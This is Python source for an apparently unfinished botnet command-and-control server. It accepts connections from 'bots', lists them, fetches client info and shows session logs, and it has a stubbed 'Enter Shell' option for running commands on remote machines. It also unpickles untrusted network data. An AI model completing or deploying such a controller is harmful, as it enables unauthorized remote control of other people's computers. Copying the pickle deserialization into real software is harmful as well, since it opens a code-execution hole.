import random
import socket, pickle#, security
import string
import threading, traceback
import time
from datetime import datetime
from colorama import init, Fore, Back, Style

init(autoreset=True)

addr = ('192.168.0.224', 5000)
#decryptor = security.get_decryptor()
#todo - client->server communication encrypted, server->client not

standard_text = Fore.YELLOW
warning_text = Fore.RED + Style.BRIGHT
users = []

def is_int(str):
    try:
        return int(str)
    except:
        return False

def get_choice(opts, title):
    opt = None
    while not opt or not is_int(opt) or not 1 <= int(opt) <= len(opts):
        print(Back.CYAN + Fore.BLACK + ' ' + title + ' ')
        for opt in enumerate(opts):
            print(f'{Fore.BLUE}{opt[0] + 1}. {opt[1]}')
        opt = input(Fore.CYAN + '> ')
    return int(opt) - 1

def show(d):
    for value in d:
        print(f'{Fore.GREEN + Style.BRIGHT}{value.capitalize()}: {Fore.MAGENTA}{d[value]}')

def get_user(id):
    for user in users:
        if user.id == id:
            return user

class User():
    def __init__(self, conn, name):
        self.conn = conn
        self.ip, self.port = conn[1][0], conn[1][1]
        self.name = name
        self.hist = []
        self.msg = None
        self.alive = True
        self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
        threading.Thread(target=self.keep_alive, args=()).start()

    def keep_alive(self):
        while True:
            try:
                self.conn[0].send(pickle.dumps('keepalive'))
                time.sleep(3)
            except:
                self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
                self.alive = False
                return

    def send(self, msg):
        self.conn[0].send(pickle.dumps(msg))
        self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})

    def get_response(self): #todo add what to do if client dc while waiting for response
        # get next msg from user
        print(standard_text + 'Waiting for client response...') #todo prob add timeout
        self.old_num = len([m for m in self.hist if m['from'] == 'client'])
        while self.old_num == len([m for m in self.hist if m['from'] == 'client']):
            pass
        return [m for m in self.hist if m['from'] == 'client'][-1]['msg']

    def read(self):
        try:
            self.msg = self.conn[0].recv(4096)
            self.msg = clean(self.msg)
        except:
            self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            self.alive = False
            return -2
        if self.msg != -1:
            self.hist.append({'from': 'client', 'msg': self.msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            return self.msg

def clean(msg):
    try:
        #msg = decryptor.decrypt(msg)
        return pickle.loads(msg)
    except ValueError:
        return -1

def handle_user(user):
    while user.alive: #todo maybe dont stop monitoring on dc?
        msg = user.read()
        if msg:
            if msg == -2:
                #print(f'{user.ip}:{user.port} disconnected')
                return
            else:
                #print(f'msg recv from user at {user.ip}:{user.port}: {msg}')
                user.send('Msg from server') #todo should i remove this?
        else:
            #todo make this better
            #print(f'invalid msg recv from {user.ip}:{user.port}, notifying client')
            user.send('Invalid input recieved')
#todo if dc and reconnect from one client, port changes -> user changes, false extra in list of bots
def get_instructions(): #todo add file down/uploading from bot, add more options
    opt = get_choice(['Select a bot'], 'Main Menu')
    if opt == 0:
        curr_users = [u.id for u in users]  # in case list of users changes before selection made
        opt = get_choice([f'{user.name} | {user.ip}:{user.port} | {"ALIVE" if user.alive else "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:' if len(users) > 0 else f'Select a bot: {warning_text} No bots found!!!')
        if opt == len(curr_users):
            get_instructions()
        else:
            user = get_user(curr_users[opt])
            if user.alive:
                bot_opts = ['Enter Shell', 'View bot info', 'View bot session logs', 'Main Menu']
                opt = get_choice(bot_opts, 'Choose an action:')
                if opt == 0:
                    cmd = input('Enter a command: ')
                    confirm = input(f'Are you sure you would like to run "{cmd}" on {user.ip}:{user.port}? (y/n) ')
                    if confirm.lower().startswith('y'):
                        print(standard_text + f'Running command...')
                        print('TODO make command actually run') #TODO turn this section into shell
                elif opt == 1:
                    user.send('getinfo')
                    response = user.get_response()
                    print(standard_text + f'Client info received from {user.name}:')
                    show(response)
                elif opt == 2:
                    for msg in user.hist: #todo just give last 100 lines? add option for full?
                        print(Fore.MAGENTA + f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
                get_instructions()
            else:
                print(warning_text + 'Dead bot, chose a live one')
                get_instructions()

def run():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(addr)
    server.listen()
    print(standard_text + f'Server running on {addr[0]}:{addr[1]}')

    threading.Thread(target=get_instructions, args=()).start()

    while True:
        conn = server.accept()
        try:
            name = conn[0].recv(4096)
            name = clean(name)['name']
            user = User(conn, name)
            users.append(user)
            threading.Thread(target=handle_user, args=(user, )).start()
        except:
            print(warning_text + 'Discarding connection because invalid name recieved from {conn[1][0]}:{conn[1][1]}')


if __name__ == '__main__':
    run()